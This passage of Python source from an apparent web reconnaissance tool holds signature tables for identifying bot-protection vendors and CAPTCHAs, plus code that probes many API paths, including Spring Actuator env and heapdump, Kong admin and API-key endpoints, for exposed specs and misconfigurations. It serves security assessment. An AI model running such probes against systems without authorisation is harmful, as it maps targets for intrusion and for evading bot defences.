    # Ref: https://developers.cloudflare.com/fundamentals/reference/policies-compliances/cloudflare-cookies/
    # Detection: JS challenge (cf_clearance), bot score (__cf_bm), behavioral + TLS fingerprint
    # __cf_bm — Bot Management / Bot Fight Mode, 30min cookie, encrypted bot score
    # __cfseq — Sequence Analytics, tracks request order
    # cf_clearance — passed JS/managed/interactive challenge, stores JS detection result
    # _cfuvid — Rate Limiting Rules, visitor ID for shared-IP disambiguation
    # __cfruid — legacy Rate Limiting visitor ID
    # __cflb — Load Balancer session affinity
    # __cfwaitingroom — Waiting Room queue cookie
    # cf_chl_rc_i/ni/m — Challenge Platform interaction/non-interaction/managed cookies
    {
        "id": "cloudflare_bot_mgmt", "label": "Cloudflare Bot Management",
        "method": "JS challenge + behavioral analysis + TLS fingerprint + bot score",
        "cookies": ["__cf_bm"],
        "js_body": [re.compile(r'/cdn-cgi/challenge-platform', re.I)],
        "headers": [],
        "category": "bot_management",
    },
    {
        "id": "cloudflare_js_challenge", "label": "Cloudflare JS Challenge",
        "method": "Browser must execute JS to solve challenge; result stored in cf_clearance",
        "cookies": ["cf_clearance", "cf_chl_rc_i", "cf_chl_rc_ni", "cf_chl_rc_m"],
        "js_body": [
            re.compile(r'cf-browser-verification|cf_chl_opt', re.I),
            re.compile(r'jschl-answer|jschl_vc', re.I),
        ],
        "headers": ["cf-mitigated", "cf-chl-bypass"],
        "category": "js_challenge",
    },
    {
        "id": "cloudflare_rate_limit", "label": "Cloudflare Rate Limiting",
        "method": "Visitor ID cookie for per-user rate limits behind shared IPs (cf.unique_visitor_id)",
        "cookies": ["_cfuvid", "__cfruid"],
        "js_body": [],
        "headers": [],
        "category": "rate_limiting",
    },
    {
        "id": "cloudflare_sequence", "label": "Cloudflare Sequence Analytics",
        "method": "Tracks request order and timing via __cfseq cookie for sequence rule matching",
        "cookies": ["__cfseq"],
        "js_body": [],
        "headers": [],
        "category": "behavioral",
    },
    {
        "id": "cloudflare_waiting_room", "label": "Cloudflare Waiting Room",
        "method": "Queue-based access control; cookie required to proceed",
        "cookies": ["__cfwaitingroom"],
        "js_body": [],
        "headers": [],
        "category": "rate_limiting",
    },
    {
        "id": "cloudflare_turnstile", "label": "Cloudflare Turnstile",
        "method": "Non-interactive CAPTCHA widget; client-side JS challenge via challenges.cloudflare.com",
        "cookies": [],
        "js_body": [
            re.compile(r'challenges\.cloudflare\.com/turnstile', re.I),
            re.compile(r'cf-turnstile', re.I),
        ],
        "headers": [],
        "category": "captcha",
    },
    # ── Akamai ─────────────────────────────────────────────────────────
    # Detection: sensor_data JS payload → _abck cookie validation; ak_bmsc HTTP-only session
    # bm_sz — bot manager request size tracking; bm_sv — server-side validation
    # JS: akam-sw.js (service worker), bmctx (bot manager context)
    {
        "id": "akamai_bot_manager", "label": "Akamai Bot Manager",
        "method": "sensor_data JS fingerprint → _abck cookie; ak_bmsc HTTP-only session; "
                  "collects 150+ browser signals (canvas, WebGL, audio, fonts, screen, plugins)",
        "cookies": ["_abck", "ak_bmsc", "bm_sz", "bm_sv", "bm_mi"],
        "js_body": [
            re.compile(r'akam-sw\.js|akam/\d+/\w+', re.I),
            re.compile(r'bmctx|akamai.*sensor', re.I),
        ],
        "headers": [],
        "category": "bot_management",
    },
    # Akamai CDN/WAF (without full Bot Manager — WAF may block before JS is served)
    # AKA_A2 cookie, akamai-grn header, x-akam-sw-version header
    {
        "id": "akamai_cdn", "label": "Akamai CDN / WAF",
        "method": "Akamai edge platform detected (CDN/WAF layer); bot manager JS may not be served if WAF blocks first",
        "cookies": ["AKA_A2"],
        "js_body": [],
        "headers": ["akamai-grn", "x-akam-sw-version"],
        "category": "bot_management",
    },
    # ── Imperva / Incapsula ────────────────────────────────────────────
    # Detection: 2-phase JS challenge: ___utmvc (browser fingerprint via xorshift128 encoding)
    #   + reese84 (deep behavioral fingerprint with obfuscated key-value encoding)
    # Cookies: incap_ses_ (session), visid_incap_ (visitor ID), nlbi_ (load balancer)
    {
        "id": "imperva_bot", "label": "Imperva / Incapsula Bot Protection",
        "method": "2-phase JS fingerprint: ___utmvc (browser attrs via xorshift128) + "
                  "reese84 (behavioral fingerprint with obfuscated encoding); "
                  "validates cookies incap_ses_, visid_incap_",
        "cookies": ["reese84", "___utmvc", "incap_ses_", "visid_incap_", "nlbi_"],
        "js_body": [
            re.compile(r'incapsula|reese84|___utmvc', re.I),
            re.compile(r'/_Incapsula_Resource', re.I),
        ],
        "headers": ["x-iinfo", "x-cdn"],
        "category": "bot_management",
    },
    # ── PerimeterX / HUMAN Security ───────────────────────────────────
    # Detection: px.js collects device/browser properties → _px3 clearance cookie
    # _pxhd — device fingerprint hash; _pxvid — visitor ID; _pxde — data enrichment
    # POST to /<appId>/xhr/api/v2/collector for high-security sites
    # _px3 expires ~60 seconds — must be continuously refreshed
    {
        "id": "perimeterx", "label": "PerimeterX / HUMAN Security",
        "method": "px.js browser fingerprinting → _px3 clearance (60s TTL); "
                  "_pxhd device hash; behavioral biometrics (mouse, keyboard, touch); "
                  "POST to /xhr/api/v2/collector for validation",
        "cookies": ["_px3", "_px2", "_px", "_pxhd", "_pxvid", "_pxde"],
        "js_body": [
            re.compile(r'perimeterx\.com|/\w+/init\.js.*PX\w+', re.I),
            re.compile(r'px-captcha|px-block', re.I),
            re.compile(r'_pxAppId|window\._pxParam', re.I),
        ],
        "headers": ["x-px-cookies"],
        "category": "bot_management",
    },
    # ── DataDome ──────────────────────────────────────────────────────
    # Detection: JS tag collects Picasso fingerprint (canvas rendering + device class),
    #   browser signals, behavioral data → datadome cookie
    # API validation at api.datadome.co; x-datadome-* response headers
    {
        "id": "datadome", "label": "DataDome Bot Protection",
        "method": "JS tag → Picasso device fingerprint (canvas rendering for device class), "
                  "TLS fingerprint (JA3/JA4), behavioral analysis, IP reputation; "
                  "validates via api.datadome.co",
        "cookies": ["datadome"],
        "js_body": [
            re.compile(r'datadome\.co/|js\.datadome\.co', re.I),
            re.compile(r'window\.ddjskey|dd\.js|datadome\.js', re.I),
        ],
        "headers": ["x-datadome", "x-datadome-cid"],
        "category": "bot_management",
    },
    # ── Kasada ────────────────────────────────────────────────────────
    # Detection: Proof-of-Work JS challenge (client must solve computational puzzle);
    #   kasada.js generates KP_UIDz-ssn/KP_UIDz cookies
    # __kBT cookie for tracking; cd_kbt_ for session
    {
        "id": "kasada", "label": "Kasada Bot Protection",
        "method": "JavaScript Proof-of-Work challenge (computational puzzle); "
                  "sensor collection via kasada.js → KP_UIDz session cookies; "
                  "149+ device/browser signals",
        "cookies": ["KP_UIDz-ssn", "KP_UIDz", "__kBT", "cd_kbt_"],
        "js_body": [
            re.compile(r'kasada\.io|/ips\.js\?', re.I),
            re.compile(r'cd_kbt_|__kBT', re.I),
        ],
        "headers": ["x-kpsdk-ct", "x-kpsdk-cd", "x-kpsdk-v"],
        "category": "bot_management",
    },
    # ── F5 Shape Security ─────────────────────────────────────────────
    # Detection: Shape Defense Engine (L7 reverse proxy); Shape AI Cloud ML;
    #   f5_cspm.js client-side protection; encrypted JS signals
    {
        "id": "shape_security", "label": "F5 Shape Security",
        "method": "Shape Defense Engine (L7 reverse proxy) + Shape AI Cloud ML analysis; "
                  "f5_cspm.js client-side JS signals; real-time request classification",
        "cookies": ["f5_cspm", "TS01", "TSPD_101", "TSf5_cspm"],
        "js_body": [
            re.compile(r'f5_cspm\.js|f5aas|shapedetect', re.I),
            re.compile(r'shape\.com|shapesecurity', re.I),
        ],
        "headers": [],
        "category": "bot_management",
    },
    # ── Distil Networks (now part of Imperva) ─────────────────────────
    {
        "id": "distil", "label": "Distil Networks (Imperva Advanced Bot Protection)",
        "method": "JS fingerprint + behavioral analysis; device fingerprint + mouse/keyboard patterns",
        "cookies": ["D_IID", "D_SID", "D_ZID", "D_BDID", "D_HID"],
        "js_body": [re.compile(r'distil\.js|distilnetworks|d_biometric', re.I)],
        "headers": ["x-distil-cs"],
        "category": "bot_management",
    },
    # ── FingerprintJS (identification, not blocking) ──────────────────
    {
        "id": "fingerprintjs", "label": "FingerprintJS Pro",
        "method": "Browser fingerprinting SDK (canvas, WebGL, audio, fonts, screen); "
                  "generates stable visitorId across sessions; used for fraud detection",
        "cookies": ["_vid_t"],
        "js_body": [
            re.compile(r'fingerprintjs|fpjs\.io|fingerprint\.com', re.I),
            re.compile(r'FingerprintJS\.load|fpPromise', re.I),
        ],
        "headers": [],
        "category": "fingerprinting",
    },
    # ── CAPTCHA providers ─────────────────────────────────────────────
    {
        "id": "recaptcha_v2", "label": "Google reCAPTCHA v2",
        "method": "Visual challenge; requires user interaction (checkbox or image grid)",
        "cookies": [],
        "js_body": [re.compile(r'google\.com/recaptcha/api\.js(?!\S*enterprise)', re.I),
                    re.compile(r'g-recaptcha(?!.*invisible)', re.I)],
        "headers": [],
        "category": "captcha",
    },
    {
        "id": "recaptcha_v3", "label": "Google reCAPTCHA v3 (invisible)",
        "method": "Invisible behavioral scoring; no user interaction; score 0.0-1.0",
        "cookies": [],
        "js_body": [re.compile(r'grecaptcha\.execute\s*\(', re.I),
                    re.compile(r'recaptcha.*render.*=', re.I)],
        "headers": [],
        "category": "captcha",
    },
    {
        "id": "recaptcha_enterprise", "label": "Google reCAPTCHA Enterprise",
        "method": "Enterprise-grade scoring + risk analysis; custom thresholds",
        "cookies": [],
        "js_body": [re.compile(r'google\.com/recaptcha/enterprise\.js', re.I)],
        "headers": [],
        "category": "captcha",
    },
    {
        "id": "hcaptcha", "label": "hCaptcha",
        "method": "Privacy-focused CAPTCHA; visual challenge or passive mode",
        "cookies": [],
        "js_body": [re.compile(r'hcaptcha\.com/1/api\.js', re.I),
                    re.compile(r'h-captcha', re.I)],
        "headers": [],
        "category": "captcha",
    },
]


def check_bot_protection(host: str, port: int, use_ssl: bool,
                         timeout: int = 5,
                         extra_headers: Optional[Dict[str, str]] = None,
                         body: str = "", resp_headers: Optional[Dict[str, str]] = None,
                         ) -> Dict[str, Any]:
    """Detect bot protection / anti-automation mechanisms with research-accurate
    per-vendor cookie, JavaScript, and header signatures.

    Each detection includes the vendor's actual detection method so the report
    can explain *how* bots are detected, not just *what* product is present.
    """
    result: Dict[str, Any] = {
        "vendors": [],      # detailed per-vendor findings
        "captcha": [],
        "bot_management": [],
        "fingerprinting": [],
        "rate_limiting": [],
        "js_challenge": False,
        "summary": "",
    }
    hdrs = resp_headers or {}
    cookie_str = hdrs.get("set-cookie", "")
    detected_ids: set = set()

    for vendor in _BOT_VENDORS:
        vid = vendor["id"]
        if vid in detected_ids:
            continue

        signals: List[str] = []  # what we actually matched

        # Cookie detection
        for cname in vendor["cookies"]:
            if cname.lower() in cookie_str.lower():
                signals.append(f"cookie:{cname}")

        # JS/body pattern detection
        for pat in vendor["js_body"]:
            if pat.search(body):
                signals.append("js_body")
                break

        # Header detection
        for hdr_key in vendor["headers"]:
            if hdrs.get(hdr_key):
                signals.append(f"header:{hdr_key}")

        if not signals:
            continue

        detected_ids.add(vid)
        entry = {
            "id": vid,
            "label": vendor["label"],
            "category": vendor["category"],
            "method": vendor["method"],
            "signals": signals,
        }
        result["vendors"].append(entry)

        cat = vendor["category"]
        if cat == "captcha":
            result["captcha"].append(vendor["label"])
        elif cat == "bot_management":
            result["bot_management"].append(vendor["label"])
        elif cat == "fingerprinting":
            result["fingerprinting"].append(vendor["label"])
        elif cat == "rate_limiting":
            result["rate_limiting"].append(vendor["label"])
        elif cat == "js_challenge":
            result["js_challenge"] = True

    # Also keep backward-compatible "protections" key
    result["protections"] = result["vendors"]

    n = len(result["vendors"])
    parts = []
    if result["bot_management"]:
        parts.append(f"Bot mgmt: {', '.join(result['bot_management'])}")
    if result["captcha"]:
        parts.append(f"CAPTCHA: {', '.join(result['captcha'])}")
    if result["rate_limiting"]:
        parts.append(f"Rate limit: {', '.join(result['rate_limiting'])}")
    if result["fingerprinting"]:
        parts.append(f"Fingerprint: {', '.join(result['fingerprinting'])}")
    if result["js_challenge"]:
        parts.append("JS challenge active")
    result["summary"] = f"{n} bot protection(s): {'; '.join(parts)}" if n else "No bot protection detected"
    return result


# ---------------------------------------------------------------------------
# API Security Detection (#6, #7)
# ---------------------------------------------------------------------------

_API_SECURITY_PATHS = [
    # OpenAPI / Swagger spec discovery
    ("/swagger.json", "swagger"),
    ("/swagger/v1/swagger.json", "swagger"),
    ("/api-docs", "swagger_ui"),
    ("/api-docs.json", "swagger"),
    ("/swagger-ui.html", "swagger_ui"),
    ("/swagger-ui/", "swagger_ui"),
    ("/openapi.json", "openapi"),
    ("/openapi.yaml", "openapi"),
    ("/v1/openapi.json", "openapi"),
    ("/v2/openapi.json", "openapi"),
    ("/v3/api-docs", "openapi"),
    ("/docs", "fastapi_docs"),
    ("/redoc", "redoc"),
    # GraphQL
    ("/graphql", "graphql"),
    ("/graphiql", "graphiql"),
    ("/altair", "altair"),
    ("/playground", "graphql_playground"),
    # Health / metadata
    ("/health", "health"),
    ("/healthz", "health"),
    ("/ready", "health"),
    ("/status", "health"),
    ("/metrics", "metrics"),
    ("/actuator", "spring_actuator"),
    ("/actuator/health", "spring_actuator"),
    # Common API versioned paths
    ("/api/v1", "api"),
    ("/api/v2", "api"),
    ("/api/v3", "api"),
    ("/api", "api"),
    ("/v1", "api"),
    ("/v2", "api"),
    # gRPC / gRPC-gateway
    ("/grpc.health.v1.Health/Check", "grpc"),
    ("/.grpc", "grpc"),
    # AsyncAPI / event-driven APIs
    ("/asyncapi.json", "asyncapi"),
    ("/asyncapi.yaml", "asyncapi"),
    # WSDL / SOAP (still common in enterprise)
    ("/wsdl", "wsdl"),
    ("/soap/wsdl", "wsdl"),
    ("/service.wsdl", "wsdl"),
    ("/?wsdl", "wsdl"),
    # GraphQL persisted queries / schema
    ("/graphql/schema.graphql", "graphql_schema"),
    ("/graphql/schema", "graphql_schema"),
    # Spring Actuator (deeper paths)
    ("/actuator/env", "spring_actuator"),
    ("/actuator/info", "spring_actuator"),
    ("/actuator/beans", "spring_actuator"),
    ("/actuator/mappings", "spring_actuator"),
    ("/actuator/loggers", "spring_actuator"),
    ("/actuator/heapdump", "spring_actuator"),
    # Debug / admin endpoints
    ("/debug", "debug"),
    ("/console", "debug"),
    ("/admin/api", "debug"),
    ("/_debug", "debug"),
    ("/_/info", "debug"),
    # JSON schema validation endpoint (some APIs expose)
    ("/schema.json", "schema"),
    ("/api/schema", "schema"),
    # API key management
    ("/api/keys", "api_keys"),
    ("/apikeys", "api_keys"),
    ("/api/tokens", "api_keys"),
    # Changelog / versioning info
    ("/api/changelog", "api"),
    ("/changelog.json", "api"),
    # Healthchecks (Kubernetes-style)
    ("/livez", "health"),
    ("/readyz", "health"),
    ("/startup", "health"),
    # AWS / cloud vendor health
    ("/.well-known/health", "health"),
    ("/.well-known/openid-configuration", "openid"),
    ("/.well-known/jwks.json", "openid"),
    ("/.well-known/jwks", "openid"),
    # Tyk API gateway
    ("/tyk/keys", "tyk"),
    ("/tyk/reload", "tyk"),
    # Kong admin (should not be public)
    ("/plugins", "kong_admin"),
    ("/routes", "kong_admin"),
    ("/services", "kong_admin"),
    ("/consumers", "kong_admin"),
    # Fastify / NestJS
    ("/api-json", "openapi"),
    ("/api-yaml", "openapi"),
]

_API_RATE_LIMIT_HEADERS = {
    # Standard & de facto rate limit headers
    "x-ratelimit-limit": "Rate limit ceiling",
    "x-ratelimit-remaining": "Remaining requests",
    "x-ratelimit-reset": "Reset timestamp",
    "ratelimit-limit": "IETF draft rate limit",
    "ratelimit-remaining": "IETF draft remaining",
    "ratelimit-reset": "IETF draft reset",
    "ratelimit-policy": "IETF draft policy",
    "retry-after": "Retry delay (seconds or date)",
    "x-rate-limit-limit": "Rate limit (alt format)",
    "x-rate-limit-remaining": "Remaining (alt format)",
    "x-rate-limit-reset": "Reset (alt format)",
    # Vendor-specific
    "x-github-request-limit": "GitHub rate limit",
    "x-shopify-shop-api-call-limit": "Shopify API limit",
    # ── LLM Provider rate limit headers (confirmed from docs/testing) ──
    # OpenAI (https://platform.openai.com/docs/guides/rate-limits)
    "x-ratelimit-limit-requests":        "OpenAI rate limit (requests)",
    "x-ratelimit-limit-tokens":          "OpenAI rate limit (tokens)",
    "x-ratelimit-remaining-requests":    "OpenAI remaining (requests)",
    "x-ratelimit-remaining-tokens":      "OpenAI remaining (tokens)",
    "x-ratelimit-reset-requests":        "OpenAI rate limit reset (requests)",
    "x-ratelimit-reset-tokens":          "OpenAI rate limit reset (tokens)",
    # Anthropic (https://docs.anthropic.com/en/api/rate-limits)
    "anthropic-ratelimit-requests-limit":      "Anthropic rate limit (requests)",
    "anthropic-ratelimit-requests-remaining":  "Anthropic remaining (requests)",
    "anthropic-ratelimit-requests-reset":      "Anthropic reset (requests)",
    "anthropic-ratelimit-tokens-limit":        "Anthropic rate limit (tokens)",
    "anthropic-ratelimit-tokens-remaining":    "Anthropic remaining (tokens)",
    "anthropic-ratelimit-tokens-reset":        "Anthropic reset (tokens)",
    "anthropic-ratelimit-input-tokens-limit":  "Anthropic input token limit",
    "anthropic-ratelimit-output-tokens-limit": "Anthropic output token limit",
    # Groq (https://console.groq.com/docs/rate-limits)
    "x-groq-req-limit":                  "Groq request limit",
    "x-groq-req-remaining":              "Groq requests remaining",
    "x-groq-req-reset":                  "Groq request reset",
    "x-groq-token-limit":                "Groq token limit",
    "x-groq-token-remaining":            "Groq tokens remaining",
    "x-groq-tokens-consumed":            "Groq tokens consumed",
    # Hugging Face (https://huggingface.co/docs/api-inference/rate-limits)
    "x-inference-provider":              "HuggingFace inference provider",
    "x-request-id":                      "HuggingFace request ID",
    # Google Gemini / Vertex AI
    "x-goog-quota-remaining":            "Google quota remaining",
    "x-goog-quota-limit":                "Google quota limit",
    # Together AI
    "x-together-rate-limit-requests":    "Together AI rate limit",
    # Cohere
    "x-cohere-rate-limit-requests":      "Cohere rate limit",
    # Mistral
    "x-mistral-rate-limit":              "Mistral AI rate limit",
    # Generic AI/ML platforms
    "x-token-count":                     "Token count (generic LLM)",
    "x-tokens-used":                     "Tokens used (generic LLM)",
    "x-tokens-remaining":                "Tokens remaining (generic LLM)",
    "x-request-cost":                    "Request cost / compute units",
}

_API_AUTH_HEADERS = {
    "www-authenticate": "Auth scheme required",
    "x-api-key": "API key header present",
    "authorization": "Auth header echoed",
}

# Headers that indicate schema validation / positive API security controls
# These are GOOD signals — presence means the API has security controls
_API_SCHEMA_VALIDATION_HEADERS = {
    # JSON Schema / OpenAPI validation
    "x-content-type-options":   "Content-type sniffing protection (nosniff)",
    "content-security-policy":  "CSP applied to API responses",
    "x-frame-options":          "Clickjacking protection",
    # Input validation signals
    "x-permitted-cross-domain-policies": "Cross-domain policy enforcement",
    # Schema/contract headers
    "link":                     "API link header (HATEOAS / schema reference)",
    "x-api-version":            "Explicit API versioning (good governance)",
    "api-version":              "Explicit API versioning",
    "sunset":                   "API versioning/deprecation policy",
    "deprecation":              "API deprecation notice",
}

# Headers indicating API security vendors/products
_API_SECURITY_VENDOR_HEADERS = {
    # Salt Security
    "x-salt-request-id":        "Salt Security API Protection",
    # Traceable AI
    "x-traceable-traceid":      "Traceable AI API Security",
    # Noname Security (passive agent — infers from response patterns)
    # Cequence Security (CQ Prime)
    "x-cq-request-id":         "Cequence Security CQ Prime",
    # Wallarm
    "x-wallarm-request-uuid":   "Wallarm API Security",
    # Imperva API Security
    "x-ilock-reason":           "Imperva API Security",
    # Cloudflare API Shield
    "cf-apim":                  "Cloudflare API Shield",
    # AWS API Gateway Schema Validation
    "x-amzn-error-type":        "AWS API Gateway (schema validation error)",
    # Apigee Sense (bot detection for APIs)
    "x-apigee-session":         "Apigee Sense (API bot detection)",
    # 42Crunch API Security Platform
    "x-42c-request-id":         "42Crunch API Security",
    # Spectral / OpenAPI linting (development)
    "x-api-lint":               "API linting header (dev environment)",
    # Bump.sh / Redoc OpenAPI hosting
    "x-openapi-doc-url":        "OpenAPI documentation hosted",
}

_API_GATEWAY_HEADERS = {
    # AWS
    "x-amzn-requestid":         "AWS API Gateway",
    "x-amz-apigw-id":           "AWS API Gateway",
    "x-amzn-trace-id":          "AWS X-Ray (API Gateway / ELB)",
    # Google Cloud / Apigee
    "x-goog-api-client":        "Google Cloud API Gateway",
    "x-google-backend":         "Google Cloud Endpoints",
    # ── Kong (confirmed from real kong EU/US API: eu.api.konghq.com) ──
    "x-kong-upstream-latency":  "Kong API Gateway",
    "x-kong-proxy-latency":     "Kong API Gateway",
    "x-kong-request-id":        "Kong API Gateway",
    "x-kong-response-latency":  "Kong API Gateway",      # Kong Enterprise: X-Kong-Response-Latency
    "x-kong-upstream-status":   "Kong API Gateway",
    # Kong via header (most reliable — present even on 404)
    # Detected in Via: kong-enterprise-edition or Via: kong/3.x
    # (handled separately in _check_via_header below)
    # Envoy / Istio / service mesh
    "x-envoy-upstream-service-time": "Envoy / Istio",
    "x-envoy-decorator-operation":   "Envoy / Istio",
    "x-envoy-attempt-count":         "Envoy / Istio",
    # Generic gateway / tracing
    "x-request-id":             "API Gateway (generic)",
    "x-correlation-id":         "API Gateway (generic)",
    "x-trace-id":               "API Gateway / distributed tracing",
    "x-b3-traceid":             "Zipkin / distributed tracing",
    "traceparent":              "OpenTelemetry W3C Trace Context",
    "tracestate":               "OpenTelemetry trace state",
    # Apigee / Google APIM
    "x-apigee-message-id":      "Apigee API Gateway",
    "x-apigee-fault-code":      "Apigee API Gateway (error)",
    "x-apigee-fault-source":    "Apigee API Gateway (error)",
    # Mashery / Tibco
    "x-mashery-responder":      "Mashery / TIBCO API Gateway",
    "x-mashery-message-id":     "Mashery / TIBCO API Gateway",
    # Azure APIM
    "x-azure-ref":                  "Azure API Management",
    "ocp-apim-trace-location":      "Azure APIM (trace enabled — CRITICAL: leaks internal URLs)",
    "ocp-apim-subscription-key":    "Azure APIM subscription key echoed",
    # Tyk
    "x-tyk-authorization":      "Tyk API Gateway",
    "x-tyk-node-id":            "Tyk API Gateway",
    # Mulesoft Anypoint
    "x-mule-message-id":        "MuleSoft Anypoint",
    "x-mulesoft-message-id":    "MuleSoft Anypoint",
    # WSO2 API Manager
    "x-wso2-activity-id":       "WSO2 API Manager",
    "activityid":               "WSO2 API Manager (alternate)",
    # Gravitee.io
    "x-gravitee-request-id":    "Gravitee API Gateway",
    "x-gravitee-transaction-id":"Gravitee API Gateway",
    # 3scale (Red Hat)
    "x-3scale-proxy-secret-token": "3scale / Red Hat API Management",
    # Layer7 (Broadcom)
    "x-ca-err":                 "Broadcom Layer7 Gateway (error)",
    # IBM DataPower / API Connect
    "x-dp-client-ip":           "IBM DataPower / API Connect",
    "x-ibm-client-id":          "IBM API Connect",
    # Nginx Unit (modern Nginx)
    "server-timing":            "Performance API (Nginx/Apache/CDN)",
    # Traefik
    "x-traefik-requestid":      "Traefik ingress / API gateway",
    # Salt Security / API protection  (response body analysis needed but header signals exist)
    "x-salt-request-id":        "Salt Security API Protection",
    # Noname Security (passive — no header signal; detected via response timing)
    # Traceable AI
    "x-traceable-traceid":      "Traceable AI API Security",
    # Cloudflare API Shield
    "cf-cache-status":          "Cloudflare (potential API Shield)",
    # Fastly API Gateway
    "x-fastly-request-id":      "Fastly API Gateway",
    # Akamai API Gateway
    "x-akamai-request-id":      "Akamai API Gateway / EdgeGrid",
}


def check_api_security(host: str, port: int, use_ssl: bool,
                       timeout: int = 5,
                       extra_headers: Optional[Dict[str, str]] = None,
                       ) -> Dict[str, Any]:
    """Detect API security posture: authentication, rate limiting,
    OpenAPI/Swagger exposure, API gateway, and common misconfigurations.

    Probes known API documentation paths, checks rate limit headers,
    detects auth requirements, and identifies API gateways.
    """
    from fray.recon.http import _fetch_url
    import concurrent.futures

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    specs_found: List[Dict[str, Any]] = []
    api_endpoints: List[Dict[str, Any]] = []
    rate_limit_info: Dict[str, Any] = {}
    auth_info: Dict[str, Any] = {}
    gateway_info: Dict[str, Any] = {}
    schema_info: List[str] = []
    positive_security_signals: List[str] = []
    security_vendor_info: Dict[str, Any] = {}
    oidc_info: Dict[str, Any] = {}
    seen_paths: set = set()

    def _probe_api_path(path: str, category: str) -> Optional[Dict[str, Any]]:
        if path in seen_paths:
            return None
        seen_paths.add(path)
        url = f"{base}{path}"
        try:
            status, body, hdrs = _fetch_url(url, timeout=timeout, verify_ssl=True,
                                             headers=extra_headers)
            if status == 0 and use_ssl:
                status, body, hdrs = _fetch_url(url, timeout=timeout, verify_ssl=False,
                                                 headers=extra_headers)
        except Exception:
            return None

        if status == 0 or status == 404:
            return None

        entry: Dict[str, Any] = {"path": path, "status": status, "category": category}

        # ── Session cookie capture for rate limit correlation ───────────────
        set_cookie_ep = hdrs.get("set-cookie", "")
        if set_cookie_ep:
            cookie_parts = [c.split(";")[0].strip() for c in set_cookie_ep.split(",")
                            if c.strip() and "=" in c.split(";")[0]]
            if cookie_parts:
                entry["session_cookie"] = "; ".join(cookie_parts)

        # Check for OpenAPI/Swagger spec content
        ct = hdrs.get("content-type", "")
        if status == 200 and category in ("swagger", "openapi"):
            if "json" in ct or "yaml" in ct or body.strip()[:1] in ("{", "o"):
                try:
                    spec = json.loads(body[:200000]) if "json" in ct or body.strip().startswith("{") else {}
                    if spec.get("openapi") or spec.get("swagger") or spec.get("info"):
                        entry["spec_version"] = spec.get("openapi", spec.get("swagger", "unknown"))
                        entry["title"] = spec.get("info", {}).get("title", "")
                        paths = spec.get("paths", {})
                        entry["endpoints_count"] = len(paths)
                        entry["endpoints_preview"] = list(paths.keys())[:10]
                        # Check for auth definitions
                        security = spec.get("securityDefinitions", spec.get("components", {}).get("securitySchemes", {}))
                        if security:
                            entry["auth_schemes"] = list(security.keys())
                        entry["severity"] = "high"
                        entry["is_spec"] = True
                except Exception:
                    entry["is_spec"] = body.strip().startswith("{") and len(body) > 100

        # Swagger UI / docs pages
        if status == 200 and category in ("swagger_ui", "fastapi_docs", "redoc", "graphiql", "altair", "graphql_playground"):
            lower = body.lower() if body else ""
            if any(k in lower for k in ("swagger", "openapi", "api-docs", "fastapi", "redoc", "graphiql", "altair", "playground")):
                entry["exposed_ui"] = True
                entry["severity"] = "medium"

        # GraphQL introspection
        if status == 200 and category == "graphql":
            if "graphql" in body.lower() or "query" in body.lower():
                entry["graphql_active"] = True

        # Spring Actuator (info disclosure)
        if status == 200 and category == "spring_actuator":
            entry["severity"] = "high"
            entry["actuator_exposed"] = True

        # Metrics endpoint (Prometheus, etc.)
        if status == 200 and category == "metrics":
            if "# HELP" in body or "# TYPE" in body or "process_" in body:
                entry["prometheus_exposed"] = True
                entry["severity"] = "high"

        # Auth detection: 401/403 = auth required
        if status in (401, 403):
            entry["auth_required"] = True
            www_auth = hdrs.get("www-authenticate", "")
            if www_auth:
                entry["auth_scheme"] = www_auth.split()[0] if www_auth else None
                entry["auth_detail"] = www_auth[:100]

        # Rate limit headers
        for rl_hdr, rl_desc in _API_RATE_LIMIT_HEADERS.items():
            val = hdrs.get(rl_hdr)
            if val:
                if "rate_limits" not in entry:
                    entry["rate_limits"] = {}
                entry["rate_limits"][rl_hdr] = val

        # API Gateway headers
        for gw_hdr, gw_desc in _API_GATEWAY_HEADERS.items():
            val = hdrs.get(gw_hdr)
            if val:
                if "gateway" not in entry:
                    entry["gateway"] = {}
                entry["gateway"][gw_hdr] = {"value": val[:80], "vendor": gw_desc}

        # ── Schema validation signals ──────────────────────────────────────
        # JSON Schema in response body (OpenAPI 3.1+ returns schemas inline)
        schema_signals = []
        if "json" in ct and body:
            try:
                parsed_body = json.loads(body[:8000])
                # OpenAPI validation error format (RFC 7807 Problem Details)
                if isinstance(parsed_body, dict):
                    if parsed_body.get("type") and parsed_body.get("title"):
                        schema_signals.append("rfc7807_problem_details")
                    if parsed_body.get("$schema"):
                        schema_signals.append("json_schema_reference")
                    if parsed_body.get("components") and parsed_body.get("paths"):
                        schema_signals.append("openapi_spec_in_response")
            except Exception:
                pass

        # Schema validation via 400 + error body on API paths
        if status == 400 and category in ("api", "openapi", "swagger"):
            if body and any(kw in body.lower() for kw in
                            ("required", "invalid", "schema", "validation", "constraint",
                             "must be", "missing", "expected", "type", "format")):
                schema_signals.append("input_validation_400")

        # Vendor-specific schema validation headers
        for vs_hdr, vs_desc in _API_SECURITY_VENDOR_HEADERS.items():
            val = hdrs.get(vs_hdr)
            if val:
                if "security_vendor" not in entry:
                    entry["security_vendor"] = {}
                entry["security_vendor"][vs_hdr] = {"value": val[:80], "product": vs_desc}
                schema_signals.append(f"vendor:{vs_desc}")

        # Positive security posture header signals
        positive_security = []
        for ps_hdr, ps_desc in _API_SCHEMA_VALIDATION_HEADERS.items():
            if hdrs.get(ps_hdr):
                positive_security.append(ps_desc)

        # OpenID Connect / OAuth2 discovery (strong positive security)
        if category == "openid" and status == 200:
            try:
                oidc = json.loads(body[:4000]) if body else {}
                if oidc.get("issuer") or oidc.get("authorization_endpoint"):
                    entry["oidc_discovered"] = True
                    entry["oidc_issuer"] = oidc.get("issuer", "")
                    positive_security.append("OIDC/OAuth2 discovery endpoint")
                    schema_signals.append("oidc_oauth2")
            except Exception:
                pass

        if schema_signals:
            entry["schema_validation"] = schema_signals
        if positive_security:
            entry["positive_security"] = positive_security

        return entry

    # Probe all API paths concurrently
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = {
            pool.submit(_probe_api_path, path, cat): (path, cat)
            for path, cat in _API_SECURITY_PATHS
        }
        for f in concurrent.futures.as_completed(futures, timeout=timeout * 4):
            try:
                r = f.result()
                if r:
                    if r.get("is_spec"):
                        specs_found.append(r)
                    elif r.get("exposed_ui") or r.get("actuator_exposed") or r.get("prometheus_exposed"):
                        specs_found.append(r)
